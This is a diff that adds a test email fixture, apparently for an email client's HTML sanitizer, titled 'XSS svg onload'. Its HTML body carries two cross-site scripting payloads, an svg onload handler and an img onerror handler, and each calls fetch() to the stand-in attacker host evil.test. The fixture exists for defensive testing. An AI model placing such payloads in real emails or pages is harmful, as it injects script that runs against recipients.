@@ -1,0 +1,9 @@
+From: Bob Sender <bob@golub.test>
+To: Alice <alice@golub.test>
+Date: Mon, 02 Nov 2026 10:00:00 +0100
+Message-ID: <xss-svg-onload@golub.test>
+Subject: XSS svg onload
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><svg onload="fetch('https://evil.test/svg')"><circle r="5"/></svg><img src=x onerror="fetch('https://evil.test/img')"></body></html>
